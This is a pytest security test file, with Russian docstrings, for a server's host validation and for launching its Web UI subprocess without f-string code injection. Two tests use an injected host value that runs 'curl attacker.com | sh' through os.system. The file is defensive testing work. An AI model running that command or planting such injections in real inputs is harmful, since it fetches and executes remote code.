"""Тесты безопасности: F-string инъекция в subprocess (1.3)."""

from __future__ import annotations

import subprocess
import sys
from unittest.mock import MagicMock, patch

import pytest

from codelab.server.http_server import ACPHttpServer


class TestValidateHost:
    """Тесты валидации хоста."""

    def test_valid_ipv4(self) -> None:
        server = ACPHttpServer(host="127.0.0.1", port=8080)
        assert server._validate_host("127.0.0.1") == "127.0.0.1"

    def test_valid_ipv6(self) -> None:
        server = ACPHttpServer(host="127.0.0.1", port=8080)
        assert server._validate_host("::1") == "::1"

    def test_valid_hostname(self) -> None:
        server = ACPHttpServer(host="127.0.0.1", port=8080)
        assert server._validate_host("localhost") == "localhost"

    def test_valid_hostname_with_dots(self) -> None:
        server = ACPHttpServer(host="127.0.0.1", port=8080)
        assert server._validate_host("example.com") == "example.com"

    def test_valid_hostname_with_hyphens(self) -> None:
        server = ACPHttpServer(host="127.0.0.1", port=8080)
        assert server._validate_host("my-host.example.com") == "my-host.example.com"

    def test_invalid_host_with_semicolon(self) -> None:
        server = ACPHttpServer(host="127.0.0.1", port=8080)
        with pytest.raises(ValueError, match="Invalid host"):
            server._validate_host("127.0.0.1; import os; os.system('curl attacker.com | sh')")

    def test_invalid_host_with_quotes(self) -> None:
        server = ACPHttpServer(host="127.0.0.1", port=8080)
        with pytest.raises(ValueError, match="Invalid host"):
            server._validate_host('"; import os; os.system("malicious")')

    def test_invalid_host_with_spaces(self) -> None:
        server = ACPHttpServer(host="127.0.0.1", port=8080)
        with pytest.raises(ValueError, match="Invalid host"):
            server._validate_host("host with spaces")

    def test_invalid_host_empty_string(self) -> None:
        server = ACPHttpServer(host="127.0.0.1", port=8080)
        with pytest.raises(ValueError, match="Invalid host"):
            server._validate_host("")


class TestStartWebUISubprocess:
    """Тесты запуска Web UI subprocess без f-string инъекции."""

    @patch("codelab.server.web_app.is_web_ui_available")
    def test_returns_false_when_web_ui_not_available(
        self, mock_available: MagicMock,
    ) -> None:
        mock_available.return_value = False
        server = ACPHttpServer(host="127.0.0.1", port=8080)

        result = server._start_web_ui_subprocess()

        assert result is False
        assert server._web_ui_process is None

    @patch("codelab.server.web_app.is_web_ui_available")
    @patch("codelab.server.http_server.subprocess.Popen")
    def test_passes_params_via_env_not_via_fstring(
        self, mock_popen: MagicMock, mock_available: MagicMock,
    ) -> None:
        """Параметры должны передаваться через env, а не через f-string в код."""
        mock_available.return_value = True
        mock_process = MagicMock()
        mock_process.pid = 12345
        mock_popen.return_value = mock_process

        server = ACPHttpServer(host="127.0.0.1", port=8080)
        result = server._start_web_ui_subprocess()

        assert result is True
        mock_popen.assert_called_once()
        call_args = mock_popen.call_args

        # Проверяем, что вызов через модуль, а не через -c с f-string
        cmd = call_args[0][0]
        assert cmd == [sys.executable, "-m", "codelab.client.tui.serve_entry"]

        # Проверяем, что параметры переданы через env
        env = call_args[1]["env"]
        assert env["CODELAB_WS_HOST"] == "127.0.0.1"
        assert env["CODELAB_WS_PORT"] == "8080"
        assert env["CODELAB_WEB_UI_HOST"] == "127.0.0.1"
        assert env["CODELAB_WEB_UI_PORT"] == "9080"

    @patch("codelab.server.web_app.is_web_ui_available")
    @patch("codelab.server.http_server.subprocess.Popen")
    def test_validates_host_before_passing_to_env(
        self, mock_popen: MagicMock, mock_available: MagicMock,
    ) -> None:
        """Хост должен быть валидирован перед передачей в env."""
        mock_available.return_value = True
        mock_process = MagicMock()
        mock_process.pid = 12345
        mock_popen.return_value = mock_process

        server = ACPHttpServer(host="127.0.0.1", port=8080)
        result = server._start_web_ui_subprocess()

        assert result is True
        call_args = mock_popen.call_args
        env = call_args[1]["env"]
        assert env["CODELAB_WS_HOST"] == "127.0.0.1"

    @patch("codelab.server.web_app.is_web_ui_available")
    def test_invalid_host_raises_value_error(
        self, mock_available: MagicMock,
    ) -> None:
        """Некорректный хост должен вызывать ValueError."""
        mock_available.return_value = True

        malicious_host = "127.0.0.1; import os; os.system('curl attacker.com | sh')"
        server = ACPHttpServer(host=malicious_host, port=8080)

        result = server._start_web_ui_subprocess()

        # Должен вернуть False из-за исключения
        assert result is False
        assert server._web_ui_process is None

    @patch("codelab.server.web_app.is_web_ui_available")
    @patch("codelab.server.http_server.subprocess.Popen")
    def test_web_ui_url_is_set_correctly(
        self, mock_popen: MagicMock, mock_available: MagicMock,
    ) -> None:
        """URL Web UI должен быть установлен корректно."""
        mock_available.return_value = True
        mock_process = MagicMock()
        mock_process.pid = 12345
        mock_popen.return_value = mock_process

        server = ACPHttpServer(host="127.0.0.1", port=8080)
        result = server._start_web_ui_subprocess()

        assert result is True
        assert server._web_ui_url == "http://127.0.0.1:9080/"

    @patch("codelab.server.web_app.is_web_ui_available")
    @patch("codelab.server.http_server.subprocess.Popen")
    def test_subprocess_uses_devnull_for_stdio(
        self, mock_popen: MagicMock, mock_available: MagicMock,
    ) -> None:
        """Subprocess должен использовать DEVNULL для stdout/stderr."""
        mock_available.return_value = True
        mock_process = MagicMock()
        mock_process.pid = 12345
        mock_popen.return_value = mock_process

        server = ACPHttpServer(host="127.0.0.1", port=8080)
        server._start_web_ui_subprocess()

        call_kwargs = mock_popen.call_args[1]
        assert call_kwargs["stdout"] == subprocess.DEVNULL
        assert call_kwargs["stderr"] == subprocess.DEVNULL
        assert call_kwargs["start_new_session"] is True
